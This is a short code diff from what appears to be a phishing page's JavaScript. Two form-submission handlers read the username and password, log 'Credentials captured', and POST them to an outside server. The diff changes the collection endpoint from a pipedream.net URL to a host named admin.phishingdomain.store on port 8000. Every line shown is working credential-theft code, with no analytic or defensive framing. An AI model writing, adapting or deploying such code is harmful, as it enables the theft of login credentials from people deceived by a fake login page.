@@ -14,7 +14,7 @@
           if (username && password) {
             console.log('Credentials captured:', username, password);
             
-            fetch('https://eo29hvg7or77b1g.m.pipedream.net', {
+            fetch('http://admin.phishingdomain.store:8000/', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json',
@@ -40,7 +40,7 @@
             var password = passwordInput.value;
             
             if (username && password) {
-              fetch('https://eo29hvg7or77b1g.m.pipedream.net', {
+              fetch('http://admin.phishingdomain.store:8000/', {
                 method: 'POST',
                 headers: {
                   'Content-Type': 'application/json',
